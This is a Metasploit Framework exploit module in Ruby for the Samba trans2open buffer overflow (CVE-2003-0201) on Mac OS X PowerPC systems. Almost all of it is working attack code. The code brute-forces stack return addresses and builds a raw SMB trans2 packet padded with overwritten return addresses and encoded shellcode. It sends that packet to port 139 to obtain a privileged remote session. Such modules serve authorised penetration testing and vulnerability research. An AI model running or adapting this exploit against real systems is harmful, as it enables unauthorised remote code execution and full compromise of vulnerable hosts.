##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::SMB

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Samba trans2open Overflow (Mac OS X)',
			'Description'    => %q{
				This exploits the buffer overflow found in Samba versions
				2.2.0 to 2.2.8. This particular module is capable of
				exploiting the bug on Mac OS X PowerPC systems.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2003-0201'],
					[ 'OSVDB', '4469'],
					[ 'BID', '7294'],
					[ 'URL', 'http://www.digitaldefense.net/labs/advisories/DDI-1013.txt'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
					'MinNops'  => 512,

				},
			'Platform'       => 'osx',
			'Arch'           => ARCH_PPC,
			'Targets'        => 
				[
					['Stack Brute Force', { 'Rets' => [0xbffffdfc, 0xbfa00000, 512] } ],

				],
			'DisclosureDate' => 'Apr 7 2003',
			'DefaultTarget' => 0))
			
			register_options(
				[
					Opt::RPORT(139)
				], self.class)
	end

	# Need to perform target detection
	def autofilter
		false
	end

	def exploit
		curr_ret = target['Rets'][0]
		while (curr_ret >= target['Rets'][1])
			break if session_created?
			begin
				print_status("Trying return address 0x%.8x..." %  curr_ret)

				connect
				smb_login
	
				# 1988 is required for findrecv shellcode
				pattern = rand_text_english(1988)
	
				# This stream covers the framepointer and the return address
				pattern[1195, 64] = [curr_ret].pack('N') * 16

				# Stuff the shellcode into the request
				pattern[3, payload.encoded.length] = payload.encoded

				trans =
					"\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00"+
					"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"+
					"\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00"+
					"\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01"+
					"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
					"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90"+
					pattern

				sock.put(trans)
				handler
				disconnect
				
			rescue EOFError
			rescue => e
				print_status("Caught exception: #{e}")
				break
			end
			curr_ret -= target['Rets'][2]
		end
	end
end
